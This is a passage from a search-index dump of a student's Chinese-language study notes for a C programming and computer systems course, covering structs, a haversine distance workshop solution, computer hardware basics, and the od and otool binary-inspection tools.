     // \u6bd4\u8d5b\u573a\u6b21\n    int     won;                            // \u80dc\u573a\u6570\n    int     lost;                           // \u8d25\u573a\u6570\n    int     drawn;                          // \u5e73\u5c40\u573a\u6b21\n    int     bfor;                           // \u8fdb\u7403\u6570\n    int     bagainst;                       // \u5931\u7403\u6570\n    int     points;                         // \u79ef\u5206\n} team[MAX_TEAMS] = {\n    {\"Team A\", 10, 6, 2, 2, 20, 10, 20},    // \u5b9a\u4e49\u7b2c\u4e00\u4e2a\u961f\u4f0d\u7684\u6570\u636e\n    {\"Team B\", 12, 8, 3, 1, 25, 15, 25},    // \u5b9a\u4e49\u7b2c\u4e8c\u4e2a\u961f\u4f0d\u7684\u6570\u636e\n    {\"Team C\", 11, 5, 5, 1, 18, 18, 16}     // \u5b9a\u4e49\u7b2c\u4e09\u4e2a\u961f\u4f0d\u7684\u6570\u636e\n};\n\n// \u6253\u5370\u6240\u6709\u961f\u4f0d\u7684\u4fe1\u606f\nvoid printTeams() {\n    for (int i = 0; i &lt; MAX_TEAMS; i++) {\n        printf(\"Team Name: %s\\n\", team[i].teamname);\n        printf(\"Played: %d, Won: %d, Lost: %d, Drawn: %d\\n\", team[i].played, team[i].won, team[i].lost, team[i].drawn);\n        printf(\"Goals For: %d, Goals Against: %d, Points: %d\\n\", team[i].bfor, team[i].bagainst, team[i].points);\n        printf(\"--------------------------\\n\");\n    }\n}\n\nint main() {\n    printTeams();   // \u8c03\u7528\u51fd\u6570\u6253\u5370\u961f\u4f0d\u4fe1\u606f\n    return 0;\n}\n</code></pre> <p>\u8fd9\u6837\u7ba1\u7406\u5b9a\u4e49\u6781\u5176\u65b9\u4fbf\uff0c\u5982\u679c\u662f\u975e\u533f\u540d\u51fd\u6570\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define MAX_TEAMS               3           // \u5b9a\u4e49\u961f\u4f0d\u6570\u91cf\n#define MAX_TEAMNAME_LEN        30          // \u6700\u5927\u961f\u4f0d\u540d\u79f0\u957f\u5ea6\n\n// \u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\u7c7b\u578b Team\nstruct Team {\n    char    teamname[MAX_TEAMNAME_LEN+1];   // \u961f\u4f0d\u540d\u79f0\n    int     played;                         // \u6bd4\u8d5b\u573a\u6b21\n    int     won;                            // \u80dc\u573a\u6570\n    int     lost;                           // \u8d25\u573a\u6570\n    int     drawn;                          // \u5e73\u5c40\u573a\u6b21\n    int     bfor;                           // \u8fdb\u7403\u6570\n    int     bagainst;                       // \u5931\u7403\u6570\n    int     points;                         // \u79ef\u5206\n};\n\n// \u5b9a\u4e49 Team \u7c7b\u578b\u7684\u6570\u7ec4\nstruct Team team[MAX_TEAMS] = {\n    {\"Team A\", 10, 6, 2, 2, 20, 10, 20},    // \u7b2c\u4e00\u4e2a\u961f\u4f0d\n    {\"Team B\", 12, 8, 3, 1, 25, 15, 25},    // \u7b2c\u4e8c\u4e2a\u961f\u4f0d\n    {\"Team C\", 11, 5, 5, 1, 18, 18, 16}     // \u7b2c\u4e09\u4e2a\u961f\u4f0d\n};\n\n// \u6253\u5370\u6240\u6709\u961f\u4f0d\u7684\u4fe1\u606f\nvoid printTeams() {\n    for (int i = 0; i &lt; MAX_TEAMS; i++) {\n        printf(\"Team Name: %s\\n\", team[i].teamname);\n        printf(\"Played: %d, Won: %d, Lost: %d, Drawn: %d\\n\", team[i].played, team[i].won, team[i].lost, team[i].drawn);\n        printf(\"Goals For: %d, Goals Against: %d, Points: %d\\n\", team[i].bfor, team[i].bagainst, team[i].points);\n        printf(\"--------------------------\\n\");\n    }\n}\n\nint main() {\n    printTeams();   // \u8c03\u7528\u51fd\u6570\u6253\u5370\u961f\u4f0d\u4fe1\u606f\n    return 0;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u89c1\u9700\u8981\u53e6\u5916\u518d\u58f0\u660e variable \u540e\u8fdb\u884c assignment</p> <p>\u5982\u679c\u4e0d\u4f7f\u7528 struct \u7ed3\u6784\uff0c\u90a3\u5c31\u8981\u624b\u52a8\u91cd\u590d\u53bb\u5b9a\u4e49\u7ba1\u7406\u6240\u6709\u961f\u4f0d\uff1a</p> <pre><code>//  DEFINE THE LIMITS ON PROGRAM'S DATA-STRUCTURES\n#define MAX_TEAMS               24\n#define MAX_TEAMNAME_LEN        30\n....\n\n//  DEFINE A 2-DIMENSIONAL ARRAY HOLDING OUR UNIQUE TEAMNAMES\nchar    teamname[MAX_TEAMS][MAX_TEAMNAME_LEN+1];        // +1 for null-byte\n\n//  STATISTICS FOR EACH TEAM, INDEXED BY EACH TEAM'S 'TEAM NUMBER'\nint     played  [MAX_TEAMS];\nint     won     [MAX_TEAMS];\nint     lost    [MAX_TEAMS];\nint     drawn   [MAX_TEAMS];\nint     bfor    [MAX_TEAMS];\nint     bagainst[MAX_TEAMS];\nint     points  [MAX_TEAMS];\n....\n\n//  PRINT EACH TEAM'S RESULTS, ONE-PER-LINE, IN NO SPECIFIC ORDER\nfor(int t=0 ; t&lt;nteams ; ++t) {\n    printf(\"%s %i %i %i %i %i %i %.2f %i\\n\", // %age to 2 decimal-places\n            teamname[t],\n            played[t], won[t], lost[t], drawn[t],\n            bfor[t], bagainst[t],\n            (100.0 * bfor[t] / bagainst[t]),      // calculate percentage\n            points[t]);\n}\n</code></pre>"},{"location":"cs/c/3.1/#accessing-system-information-using-structures","title":"Accessing system information using structures","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u7684\u4fe1\u606f\u88ab\u85cf\u5728 <code>/usr/include</code> \u548c\u5176 <code>/usr/include/sys</code> \u4e2d</p> <p>\u6211\u4eec\u7528\u975e\u533f\u540d\u51fd\u6570\u4f5c\u6f14\u793a\u4f5c\u6700\u540e\u6536\u5c3e\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/time.h&gt;\n\nstruct timeval {\n    int  tv_sec;       // Seconds\n    int  tv_usec;      // Microseconds\n};\n\nstruct timeval start_time;\nstruct timeval stop_time;\n\ngettimeofday(&amp;start_time, NULL);\nprintf(\"program started at %i.06%i\\n\",\n       (int)start_time.tv_sec, (int)start_time.tv_usec);\n</code></pre> <p>\u6309\u5730\u5740\u4f20\u9012\u7ed3\u6784\uff0c\u4f7f\u7528 &amp; \u8fd0\u7b97\u7b26\uff0c \u4f7f\u5f97 gettimeofday\uff08\uff09\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u65f6\u533a\u4fe1\u606f\u7531\u4e8e\u4e0d\u611f\u5174\u8da3\u6240\u4ee5\u8bbe\u7f6e\u4e3a NULL</p>"},{"location":"cs/c/3.2/","title":"3.2 Computer Hardware","text":""},{"location":"cs/c/3.2/#wed-lecture","title":"Wed Lecture","text":"<p>\u4e3b\u8981\u8bb2\u8ff0\u8ba1\u7b97\u673a\u7ed3\u6784\u4f53\u7cfb\u4e2d\u7684\u77e5\u8bc6\uff0c\u76f4\u5230 Week 4 Mon \u5168\u90e8\u8bb2\u5b8c  </p>"},{"location":"cs/c/3.2/#main-structural-components","title":"Main Structural Components","text":"<ol> <li> <p>\u4e2d\u592e\u5904\u7406\u5668 (CPU - Central Processing Unit)</p> <ul> <li>\u6267\u884c\u7b97\u672f\u548c\u903b\u8f91\u8ba1\u7b97 (Arithmetic and Logical Computation)\u3002</li> <li>\u7ba1\u7406\u5927\u90e8\u5206\u5185\u5b58\u548c\u5916\u56f4\u8bbe\u5907\u7684\u8f93\u5165\u8f93\u51fa (Input and Output Services)\u3002</li> <li>\u53ef\u80fd\u6709\u591a\u4e2a\u5904\u7406\u5668 (Multiple Processors) \u5171\u540c\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u6216\u5e94\u7528\u7a0b\u5e8f (Operating System or User/Application Programs)\u3002</li> </ul> </li> <li> <p>\u4e3b\u5b58\u50a8\u5668 (RAM - Random Access Memory)</p> <ul> <li>\u5b58\u50a8\u6307\u4ee4\u548c\u6570\u636e (Instructions and Data)\u3002</li> <li>\u5904\u7406\u5668\u5728\u7a0b\u5e8f\u7684\u6307\u5bfc\u4e0b\u8bfb\u53d6\u548c\u5199\u5165\u5185\u5b58\u4e2d\u7684\u6570\u636e (Read and Write Memory as Directed by Programs)\u3002</li> </ul> </li> <li> <p>\u8f85\u52a9\u5b58\u50a8\u5668\u548c\u5916\u56f4\u8bbe\u5907 (Secondary Storage and Peripheral Devices)</p> <ul> <li>\u63d0\u4f9b\u957f\u671f\u3001\u6301\u4e45\u7684\u6570\u636e\u5b58\u50a8 (Long-term Persistent Storage)\uff0c\u5982\u78c1\u76d8 (Disks)\u3001\u78c1\u5e26 (Tapes)\u3002</li> <li>\u5305\u542b\u8f93\u5165/\u8f93\u51fa\u6a21\u5757\u548cI/O\u63a7\u5236\u5668 (I/O Controllers)\u3002</li> </ul> </li> <li> <p>\u7cfb\u7edf\u603b\u7ebf (System Bus)</p> <ul> <li>\u8fde\u63a5\u5904\u7406\u5668\u3001\u4e3b\u5185\u5b58\u548cI/O\u8bbe\u5907 (Connects Processor, Main Memory, and I/O Devices)\u3002</li> <li>\u5145\u5f53\u6570\u636e\u4f20\u8f93\u7684\u201c\u9ad8\u901f\u516c\u8def\u201d (Data \"Highway\")\u3002</li> <li>\u53ea\u6709\u4e00\u4e2a\u7ec4\u4ef6\u53ef\u4ee5\u63a7\u5236\u603b\u7ebf (Only One Component Can Control the Bus)\uff0c\u901a\u5e38\u901a\u8fc7\u603b\u7ebf\u4ef2\u88c1\u51b3\u5b9a (Bus Arbitration)\u3002</li> </ul> </li> </ol>"},{"location":"cs/c/3.2/#processor-registers","title":"Processor Registers","text":"<ul> <li>\u5bc4\u5b58\u5668 \u662f\u5904\u7406\u5668\u5185\u90e8\u7684\u975e\u5e38\u5feb\u901f\u7684\u5b58\u50a8\u4f4d\u7f6e (Fast Memory Locations Inside the Processor)\u3002<ul> <li>\u8bbf\u95ee\u65f6\u95f4\u901a\u5e38\u4e3a 0.5-3 \u7eb3\u79d2 (Access Time: 0.5-3 ns)\u3002</li> <li>\u5982\u679c\u6570\u636e\u5728\u5bc4\u5b58\u5668\u4e2d\u800c\u4e0d\u662f\u5728\u4e3b\u5185\u5b58\u4e2d\uff0c\u7a0b\u5e8f\u6267\u884c\u901f\u5ea6\u53ef\u80fd\u63d0\u9ad8 10-500 \u500d (Execution Speed Improvement: 10-500X)\u3002</li> <li>\u5904\u7406\u5668\u5bc4\u5b58\u5668\u7684\u6570\u91cf\u548c\u5bbd\u5ea6\uff08\u5982 64 \u4f4d\u5bc4\u5b58\u5668\uff09\u5f71\u54cd CPU \u7684\u6027\u80fd\u548c\u901f\u5ea6 (Number and Width of Registers Affect CPU Performance)\u3002</li> </ul> </li> </ul> <ul> <li> <p>\u5bc4\u5b58\u5668\u7c7b\u578b (Register Types)\uff1a</p> <ol> <li> <p>\u7528\u6237\u53ef\u8bbf\u95ee\u5bc4\u5b58\u5668 (User-Accessible Registers)\uff1a</p> <ul> <li>\u6570\u636e\u5bc4\u5b58\u5668 (Data Registers)\uff1a\u5b58\u50a8\u6570\u636e\u503c\u548c\u8fd0\u7b97\u7ed3\u679c (Hold Values Before and After Instructions)\u3002</li> <li>\u5730\u5740\u5bc4\u5b58\u5668 (Address Registers)\uff1a\u5b58\u50a8\u5185\u5b58\u4f4d\u7f6e\u7684\u5730\u5740 (Hold Addresses of Memory Locations)\uff08\u5982 MAR\u3001MBR\u3001\u7d22\u5f15\u5bc4\u5b58\u5668\u3001\u6808\u6307\u9488\uff09\u3002</li> </ul> </li> <li> <p>\u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668 (Control and Status Registers)\uff1a</p> <ul> <li>\u5b58\u50a8\u5904\u7406\u5668\u72b6\u6001 (Processor Status)\uff08\u5982\u6307\u4ee4\u5bc4\u5b58\u5668 IR\u3001\u7a0b\u5e8f\u8ba1\u6570\u5668 PC\uff09\u3002</li> <li>\u5904\u7406\u5668\u72b6\u6001\u5b57 (PSW - Processor Status Word) \u8bb0\u5f55\u5904\u7406\u5668\u72b6\u6001\u548c\u64cd\u4f5c\u7ed3\u679c (Records Processor Status and Operation Results)\uff08\u5982\u6ea2\u51fa\u3001\u8fdb\u4f4d\u3001\u9664\u96f6\u9519\u8bef\uff09\u3002</li> </ul> </li> </ol> </li> </ul>"},{"location":"cs/c/3.2/#memory-hierarchy","title":"Memory Hierarchy","text":"<ul> <li>\u5185\u5b58\u5c42\u6b21\u7ed3\u6784 \u901a\u8fc7\u4e0d\u540c\u5c42\u6b21\u7684\u5185\u5b58\u6765\u5e73\u8861\u6210\u672c\u3001\u5bb9\u91cf\u548c\u8bbf\u95ee\u65f6\u95f4 (Balancing Cost, Capacity, and Access Time)\uff1a<ul> <li>\u5bc4\u5b58\u5668\uff1a\u6700\u5feb\uff0c\u5b58\u50a81-4KB\u6570\u636e (Fastest, 1-4KB Data)\u3002</li> <li>L1/L2/L3 \u7f13\u5b58\uff1a\u6bd4\u4e3b\u5185\u5b58\u66f4\u5feb\uff0c\u5bb9\u91cf\u4ece8KB\u523064MB\u4e0d\u7b49 (Caches: 8KB-64MB)\u3002</li> <li>\u4e3b\u5185\u5b58 (RAM)\uff1a\u8f83\u5927\u5bb9\u91cf\uff0c\u8bbf\u95ee\u65f6\u95f410-60\u7eb3\u79d2 (Larger Capacity, 10-60 ns Access Time)\u3002</li> <li>\u786c\u76d8\uff1a\u6700\u6162\uff0c\u5bb9\u91cf\u6700\u5927\uff0c\u8bbf\u95ee\u65f6\u95f4\u4e3a3M-10M\u7eb3\u79d2 (Hard Disk: Slowest, Largest Capacity, 3M-10M ns Access Time)\u3002</li> <li>\u56fa\u6001\u786c\u76d8 (SSD - Solid-State Disk)\uff1a\u4ecb\u4e8e\u4e3b\u5185\u5b58\u548c\u786c\u76d8\u4e4b\u95f4\uff0c\u8bbf\u95ee\u65f6\u95f4\u4e3a0.5M-1M\u7eb3\u79d2 (Intermediate Between RAM and Hard Disk, 0.5M-1M ns Access Time)\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/3.2/#data-rates-and-byte-interpretation","title":"Data Rates and Byte Interpretation","text":"<ul> <li>\u57fa\u672c\u6570\u636e\u5355\u5143 (Basic Data Units)\uff1a<ul> <li>\u6bd4\u7279 (Bit)\uff1a\u6700\u5c0f\u7684\u6570\u636e\u5355\u5143 (Smallest Data Unit)\u3002</li> <li>\u5b57\u8282 (Byte)\uff1a\u901a\u5e38\u4e3a8\u4f4d\uff0c\u6bd4\u7279\u7684\u57fa\u672c\u7ec4\u5408\u5355\u5143 (Typically 8 Bits)\u3002</li> <li>\u5b57 (Word)\uff1a\u5904\u7406\u5668\u7684\u9ed8\u8ba4\u6570\u636e\u5927\u5c0f (Default Data Size for Processor)\uff1b\u5e38\u89c1\u4e3a32\u4f4d\u621664\u4f4d (Common Word Sizes: 32 or 64 Bits)\u3002</li> </ul> </li> </ul> <ul> <li>\u6570\u636e\u89e3\u91ca (Data Interpretation)\uff1a<ul> <li>\u6570\u636e\u7684\u542b\u4e49\u53d6\u51b3\u4e8e\u4e0a\u4e0b\u6587 (Meaning Depends on Context)\uff0c\u4f8b\u5982\uff1a<ul> <li>\u4e00\u4e3232\u4f4d\u7684\u4f4d\u6a21\u5f0f\u53ef\u80fd\u8868\u793aASCII\u5b57\u7b26\u300132\u4f4d\u6574\u6570\u3001\u6d6e\u70b9\u503c\u6216\u5185\u5b58\u5730\u5740 (32-bit Pattern Could Represent ASCII Characters, 32-bit Integer, Floating Point Value, or Memory Address)\u3002</li> <li>\u9519\u8bef\u7684\u89e3\u91ca\u4f1a\u5bfc\u81f4\u5904\u7406\u5668\u9519\u8bef (Errors in Interpretation Can Cause Processor Faults)\u3002</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/c/3.2/#workshop","title":"Workshop","text":"<p>\u8fd9\u4e2a\u4f5c\u4e1a\u91cd\u70b9\u662f\u7528 C11 \u5f00\u53d1\u51fd\u6570\u6765\u8ba1\u7b97\u5730\u7403\u8868\u9762\u4e0a\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\uff0c\u4f7f\u7528\u7684\u662fhaversine \u516c\u5f0f\u3002</p> <ol> <li>\u521b\u5efa\u6570\u636e\u7ed3\u6784\uff1a</li> </ol> <ul> <li>\u5b9a\u4e49\u4e00\u4e2a C11 \u7ed3\u6784\u4f53\uff0c\u7528\u6765\u8868\u793a\u5730\u7403\u4e0a\u7684\u4e00\u4e2a\u5730\u7406\u70b9\uff08\u5373\u7eac\u5ea6\u548c\u7ecf\u5ea6\uff09\u3002\u8fd9\u5c06\u4e3a\u4f60\u63d0\u4f9b\u4e00\u4e2a\u5b58\u50a8\u8fd9\u4e9b\u6570\u636e\u7684\u65b9\u5f0f\u3002</li> </ul> <ol> <li>\u5f00\u53d1\u4e09\u4e2a\u51fd\u6570\uff1a</li> </ol> <ul> <li>degrees_to_radians(double degrees)\u2014\u2014\u4e00\u4e2a\u5c06\u89d2\u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6\u7684\u51fd\u6570\uff08\u56e0\u4e3a\u8fd9\u4e2a\u516c\u5f0f\u662f\u57fa\u4e8e\u5f27\u5ea6\u8ba1\u7b97\u7684\uff09\u3002</li> </ul> <ul> <li>valid_location(struct point location)\u2014\u2014\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u6765\u68c0\u67e5\u4e00\u4e2a\u7ed9\u5b9a\u7684\u4f4d\u7f6e\u662f\u5426\u5408\u6cd5\uff08\u4f8b\u5982\uff0c\u7eac\u5ea6\u5fc5\u987b\u5728 -90\u00b0 \u5230 90\u00b0 \u4e4b\u95f4\uff09\u3002</li> </ul> <ul> <li>haversine(struct point location1, struct point location2)\u2014\u2014\u4e3b\u8981\u51fd\u6570\uff0c\u7528\u6765\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</li> </ul> <ol> <li>\u8bbe\u8ba1\u547d\u4ee4\u884c\u5de5\u5177\uff1a</li> </ol> <ul> <li>\u5b9e\u73b0\u7a0b\u5e8f\uff0c\u63a5\u53d7\u4ece\u547d\u4ee4\u884c\u4f20\u5165\u7684\u5750\u6807\u5bf9\uff0c\u8fd4\u56de\u8ba1\u7b97\u51fa\u7684\u8ddd\u79bb\uff08\u4ee5\u7c73\u4e3a\u5355\u4f4d\uff09\u3002</li> </ul> <ol> <li>\u6d4b\u8bd5\u5e76\u6269\u5c55\uff1a</li> </ol> <ul> <li>\u9996\u5148\uff0c\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</li> </ul> <ul> <li>\u7136\u540e\uff0c\u5f00\u53d1\u53e6\u4e00\u4e2a\u5de5\u5177\uff0c\u7528\u4e8e\u5904\u7406\u591a\u4e2a\u70b9\uff0c\u8ba1\u7b97\u4ece\u7b2c\u4e00\u4e2a\u70b9\u5230\u6700\u540e\u4e00\u4e2a\u70b9\u7684\u8ddd\u79bb\uff0c\u8def\u5f84\u6cbf\u9014\u7ecf\u8fc7\u6240\u6709\u70b9\u3002</li> </ul>"},{"location":"cs/c/3.2/#vim-template","title":"VIM Template","text":"<p>\u6559\u6388\u76f4\u63a5\u6267\u884c <code>\\vc</code> \u5c31\u5f00\u4e86\u4e00\u4e2a\u80fd\u591f\u5feb\u901f\u7f16\u5199 C \u4ee3\u7801\u7684\u6a21\u7248\uff0c\u8fd9\u79cd\u7f16\u5199\u6a21\u7248\u53ef\u4ee5\u81ea\u5df1\u5728\u67d0\u5904\u521b\u5efa\u4e00\u4e2a blank.c \u505a\u5230</p>"},{"location":"cs/c/3.2/#solutions","title":"Solutions","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdbool.h&gt;\n\n// \u5b9a\u4e49\u5730\u7403\u534a\u5f84\uff0c\u5355\u4f4d\u4e3a\u7c73\n#define EARTH_RADIUS 6371000\n\n// \u5b9a\u4e49\u7ed3\u6784\u4f53\uff0c\u8868\u793a\u5730\u7403\u4e0a\u7684\u4e00\u4e2a\u70b9\uff08\u5373\u4e00\u4e2a\u5730\u7406\u4f4d\u7f6e\uff1a\u7eac\u5ea6\u548c\u7ecf\u5ea6\uff09\nstruct point {\n    double latitude;\n    double longitude;\n};\n\n// \u5c06\u89d2\u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6\u7684\u51fd\u6570\ndouble degrees_to_radians(double degrees) {\n    return degrees * M_PI / 180.0;\n}\n\n// \u68c0\u67e5\u4e00\u4e2a\u70b9\u662f\u5426\u5408\u6cd5\u7684\u51fd\u6570\uff08\u7eac\u5ea6\u5fc5\u987b\u5728-90\u523090\u4e4b\u95f4\uff0c \u7ecf\u5ea6\u5fc5\u987b\u5728-180\u5230180\u4e4b\u95f4\uff09\nbool valid_location(struct point location) {\n    return location.latitude &gt;= -90 &amp;&amp; location.latitude &lt;= 90 &amp;&amp;\n           location.longitude &gt;= -180 &amp;&amp; location.longitude &lt;= 180;\n}\n\n// \u4f7f\u7528 haversine \u516c\u5f0f\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\ndouble haversine(struct point location1, struct point location2) {\n    double lat1 = degrees_to_radians(location1.latitude);\n    double lon1 = degrees_to_radians(location1.longitude);\n    double lat2 = degrees_to_radians(location2.latitude);\n    double lon2 = degrees_to_radians(location2.longitude);\n\n    double dlat = lat2 - lat1;\n    double dlon = lon2 - lon1;\n\n    // haversine \u516c\u5f0f\n    double a = sin(dlat / 2) * sin(dlat / 2) +\n               cos(lat1) * cos(lat2) *\n               sin(dlon / 2) * sin(dlon / 2);\n    double c = 2 * atan2(sqrt(a), sqrt(1 - a));\n\n    return EARTH_RADIUS * c;\n}\n\n// \u547d\u4ee4\u884c\u5de5\u5177\uff1a\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\nint main(int argc, char *argv[]) {\n    if (argc != 5) {\n        printf(\"Usage: %s lat1 lon1 lat2 lon2\\n\", argv[0]);\n        return 1;\n    }\n\n    struct point location1, location2;\n\n    // \u4ece\u547d\u4ee4\u884c\u53c2\u6570\u8bfb\u53d6\u4f4d\u7f6e\n    location1.latitude = atof(argv[1]);\n    location1.longitude = atof(argv[2]);\n    location2.latitude = atof(argv[3]);\n    location2.longitude = atof(argv[4]);\n\n    // \u9a8c\u8bc1\u8f93\u5165\u7684\u4f4d\u7f6e\u662f\u5426\u5408\u6cd5\n    if (!valid_location(location1) || !valid_location(location2)) {\n        printf(\"Invalid location coordinates.\\n\");\n        return 1;\n    }\n\n    // \u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\n    double distance = haversine(location1, location2);\n    printf(\"Distance: %.0f metres\\n\", distance);\n\n    return 0;\n}\n</code></pre>"},{"location":"cs/c/3.3/","title":"3.3 Functions","text":"<p>lab \u6682\u65f6\u6ca1\u65f6\u95f4\u901f\u5237\u4e86\uff0c\u6401\u7f6e\u5148\u770b Week 4 + Week 5 \u7684\u4e09\u8282\u8bfe</p>"},{"location":"cs/c/4.1/","title":"4.1 Computer Architecture","text":""},{"location":"cs/c/4.1/#mon-lecture","title":"Mon Lecture","text":"<p>Mon \u7684 Lecture \u5ef6\u7eed 3.2 \u7684\u5185\u5bb9\uff0c\u76f8\u5173\u62bd\u8c61\u7b14\u8bb0\u67e5\u770b Chapter 3.2 \u5373\u53ef\uff0c\u6700\u540e\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u53eb <code>od</code> \u7684\u5de5\u5177\uff0c\u8001\u5e08\u4e5f\u62d3\u5c55\u4e86\uff1a</p> <p><code>od</code> \u662f Unix \u548c\u7c7b Unix \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5168\u79f0\u4e3a octal dump\uff0c\u5b83\u7528\u4e8e\u4ee5\u516b\u8fdb\u5236\uff08\u6216\u5176\u4ed6\u8fdb\u5236\uff09\u7684\u5f62\u5f0f\u67e5\u770b\u6587\u4ef6\u6216\u6570\u636e\u7684\u5185\u5bb9\u3002<code>od</code> \u53ef\u4ee5\u663e\u793a\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u6216\u6570\u636e\u5757\uff0c\u5e76\u5c06\u5b83\u4eec\u4ee5\u516b\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236\u3001\u5341\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u6216 ASCII \u683c\u5f0f\u8f93\u51fa\u3002</p>"},{"location":"cs/c/4.1/#_1","title":"\u5e38\u89c1\u9009\u9879\uff1a","text":"<ul> <li><code>-b</code>\uff1a\u4ee5\u5b57\u8282\u7684\u516b\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u3002</li> <li><code>-x</code>\uff1a\u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u3002</li> <li><code>-d</code>\uff1a\u4ee5\u5341\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u3002</li> <li><code>-c</code>\uff1a\u5c06\u6bcf\u4e2a\u5b57\u8282\u663e\u793a\u4e3a ASCII \u5b57\u7b26\u3002</li> </ul>"},{"location":"cs/c/4.1/#_2","title":"\u793a\u4f8b\uff1a","text":"<p>\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a <pre><code>od -b /bin/ls\n</code></pre></p> <p>\u8be5\u547d\u4ee4\u4f1a\u4ee5\u516b\u8fdb\u5236\u5b57\u8282\u8868\u793a\u6cd5\uff0c\u67e5\u770b <code>/bin/ls</code> \u6587\u4ef6\uff08\u8fd9\u662f\u7cfb\u7edf\u4e0a\u6267\u884c <code>ls</code> \u547d\u4ee4\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff09\u7684\u5185\u5bb9\u3002</p>"},{"location":"cs/c/4.1/#_3","title":"\u8f93\u51fa\u89e3\u91ca\uff1a","text":"<p>\u8f93\u51fa\u7684\u6bcf\u4e00\u884c\u901a\u5e38\u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff1a 1. \u5de6\u4fa7\u7684\u5730\u5740\u504f\u79fb\u91cf\uff0c\u8868\u793a\u6587\u4ef6\u4e2d\u7684\u4f4d\u7f6e\u3002 2. \u53f3\u4fa7\u7684\u516b\u8fdb\u5236\u503c\uff0c\u8868\u793a\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u5185\u5bb9\u3002</p> <p>\u4f8b\u5982\uff0c\u8f93\u51fa\u7684\u4e00\u90e8\u5206\u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff1a <pre><code>0000000 177 105 114 106 002 001 001 000\n0000010 000 000 000 000 000 000 000 000\n</code></pre></p> <ul> <li><code>0000000</code> \u548c <code>0000010</code> \u8868\u793a\u6587\u4ef6\u7684\u5b57\u8282\u504f\u79fb\u4f4d\u7f6e\u3002</li> <li><code>177 105 114 ...</code> \u662f\u6587\u4ef6\u7684\u5b57\u8282\u503c\uff0c\u4ee5\u516b\u8fdb\u5236\u8868\u793a\u3002</li> </ul>"},{"location":"cs/c/4.1/#_4","title":"\u5e94\u7528\u573a\u666f\uff1a","text":"<ul> <li>\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a<code>od</code> \u53ef\u4ee5\u7528\u6765\u67e5\u770b\u65e0\u6cd5\u901a\u8fc7\u6587\u672c\u7f16\u8f91\u5668\u8bfb\u53d6\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5185\u5bb9\u3002</li> <li>\u8c03\u8bd5\uff1a\u53ef\u4ee5\u5e2e\u52a9\u5f00\u53d1\u8005\u67e5\u770b\u6587\u4ef6\u7684\u5e95\u5c42\u5b57\u8282\u7ed3\u6784\uff0c\u8c03\u8bd5\u6587\u4ef6\u683c\u5f0f\u6216\u534f\u8bae\u3002</li> <li>\u6587\u4ef6\u68c0\u67e5\uff1a\u5feb\u901f\u68c0\u67e5\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5c24\u5176\u662f\u4e00\u4e9b\u672a\u77e5\u6216\u635f\u574f\u7684\u6587\u4ef6\u3002</li> </ul> <p><code>od</code> \u662f\u4e00\u4e2a\u4f4e\u7ea7\u522b\u7684\u5de5\u5177\uff0c\u4e3b\u8981\u7528\u4e8e\u67e5\u770b\u6587\u4ef6\u7684\u539f\u59cb\u6570\u636e\u3002</p> <p><code>otool</code> \u662f macOS \u548c\u5176\u4ed6\u57fa\u4e8e Darwin \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4e13\u95e8\u7528\u4e8e\u663e\u793a\u548c\u5206\u6790 Mach-O \u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08macOS \u548c iOS \u4e0a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3001\u5e93\u3001\u76ee\u6807\u6587\u4ef6\u7b49\uff09\u3002</p> <p>Mach-O \u6587\u4ef6\u662f macOS \u548c iOS \u4e0a\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u683c\u5f0f\uff0c\u7c7b\u4f3c\u4e8e Linux \u4e0a\u7684 ELF \u6587\u4ef6\u683c\u5f0f\u3002</p>"},{"location":"cs/c/4.1/#otool","title":"<code>otool</code> \u7684\u529f\u80fd","text":"<p><code>otool</code> \u63d0\u4f9b\u4e86\u5bf9 Mach-O 